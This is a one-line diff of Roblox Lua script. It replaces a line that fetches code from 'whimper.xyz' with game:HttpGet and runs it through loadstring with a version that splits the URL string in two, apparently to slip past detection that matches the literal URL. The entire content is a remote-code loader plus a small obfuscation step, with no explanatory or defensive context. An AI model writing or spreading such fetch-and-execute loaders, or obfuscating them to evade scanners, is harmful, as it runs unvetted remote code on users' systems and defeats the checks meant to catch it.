@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://whimper.xyz/kitty'))()
+loadstring(game:HttpGet('https://whimper.xyz/ki'..'tty'))()
